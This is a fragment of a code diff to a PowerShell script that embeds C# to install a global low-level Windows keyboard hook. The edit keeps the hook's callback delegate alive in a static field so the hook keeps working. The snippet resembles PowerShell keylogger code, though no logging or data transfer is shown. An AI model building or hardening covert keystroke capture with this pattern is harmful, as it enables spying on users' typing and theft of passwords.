@@ -8,6 +8,7 @@ Add-Type -TypeDefinition @"
         public static class Program {
             private const int WH_KEYBOARD_LL = 13;
             private static IntPtr hookId = IntPtr.Zero;
+            private static HookProc hookProc;
 
             public static void Begin() {
                 hookId = SetHook();
@@ -16,8 +17,9 @@ Add-Type -TypeDefinition @"
             }
 
             private static IntPtr SetHook() {
+                hookProc = HookCallback;
                 IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
-                return SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, moduleHandle, 0);
+                return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
             }
 
             private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
